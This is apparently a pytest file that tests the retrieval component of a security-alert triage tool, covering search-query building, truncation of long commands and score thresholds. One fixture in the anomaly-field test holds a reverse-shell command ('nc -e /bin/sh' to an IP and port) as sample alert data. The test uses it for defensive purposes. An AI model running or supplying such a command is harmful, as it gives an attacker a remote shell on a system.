"""Tests for the RAG manager: search-string building and the score threshold.

Retrieval feeds the LLM its corporate context, so the search string must surface
the behavioural signal (user/process/command for anomaly alerts, source IP for
network alerts) while bounding attacker-controlled text. The score threshold is
the opt-in guard against irrelevant context contaminating a verdict.
"""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from src.rag_manager import _MAX_COMMAND_CHARS, QdrantRAGManager


@pytest.fixture
def manager() -> QdrantRAGManager:
    """A manager whose Qdrant client is mocked (constructor opens no connection)."""
    with patch("src.rag_manager.QdrantClient"):
        return QdrantRAGManager(
            qdrant_url="http://localhost:6333",
            ollama_url="http://localhost:11434",
            embedding_model_name="all-minilm",
            collection_name="soc_knowledge",
        )


def test_search_query_surfaces_anomaly_fields(manager: QdrantRAGManager) -> None:
    alert = {
        "data": {
            "anomaly_detector": {
                "agent_name": "app-host-02",
                "user": "www-data",
                "process_name": "bash",
                "command": "nc -e /bin/sh 198.51.100.77 4444",
            }
        }
    }
    query = manager._build_search_query(alert)
    assert "Host: app-host-02" in query
    assert "User: www-data" in query
    assert "Process: bash" in query
    assert "nc -e /bin/sh" in query


def test_search_query_surfaces_network_fields(manager: QdrantRAGManager) -> None:
    alert = {
        "data": {"srcip": "203.0.113.5", "dstuser": "root"},
        "rule": {"id": "5712", "description": "Multiple authentication failures", "groups": ["sshd"]},
    }
    query = manager._build_search_query(alert)
    assert "Source IP: 203.0.113.5" in query
    assert "Target user: root" in query
    assert "Multiple authentication failures" in query


def test_search_query_truncates_long_command(manager: QdrantRAGManager) -> None:
    """A pathological command must not dominate the embedding input."""
    alert = {"data": {"anomaly_detector": {"command": "A" * 5000}}}
    query = manager._build_search_query(alert)
    # The command is capped, so no run of A's longer than the cap can survive.
    assert "A" * (_MAX_COMMAND_CHARS + 1) not in query
    assert "A" * _MAX_COMMAND_CHARS in query


def test_search_query_falls_back_to_compact_json(manager: QdrantRAGManager) -> None:
    query = manager._build_search_query({"weird": "shape"})
    assert "weird" in query


@pytest.mark.parametrize(
    ("given", "expected"),
    [(None, None), (0, None), (0.0, None), (-0.3, None), (0.6, 0.6)],
)
def test_score_threshold_normalisation(given, expected) -> None:
    with patch("src.rag_manager.QdrantClient"):
        manager = QdrantRAGManager(
            qdrant_url="http://localhost:6333",
            ollama_url="http://localhost:11434",
            embedding_model_name="all-minilm",
            collection_name="soc_knowledge",
            score_threshold=given,
        )
    assert manager.score_threshold == expected


def test_generate_vector_rejects_dimension_mismatch(manager: QdrantRAGManager) -> None:
    response = MagicMock()
    response.raise_for_status.return_value = None
    response.json.return_value = {"embeddings": [[0.1, 0.2, 0.3]]}  # 3 != 384
    with patch("src.rag_manager.requests.post", return_value=response):
        with pytest.raises(ValueError):
            manager.generate_vector("anything")


def test_query_context_forwards_score_threshold(manager: QdrantRAGManager) -> None:
    manager.score_threshold = 0.5
    point = MagicMock()
    point.payload = {"text": "fragment"}
    manager.client.query_points.return_value = MagicMock(points=[point])
    with patch.object(manager, "generate_vector", return_value=[0.0] * 384):
        fragments = manager.query_context({"data": {"srcip": "203.0.113.1"}}, top_k=3)
    assert fragments == ["fragment"]
    assert manager.client.query_points.call_args.kwargs["score_threshold"] == 0.5
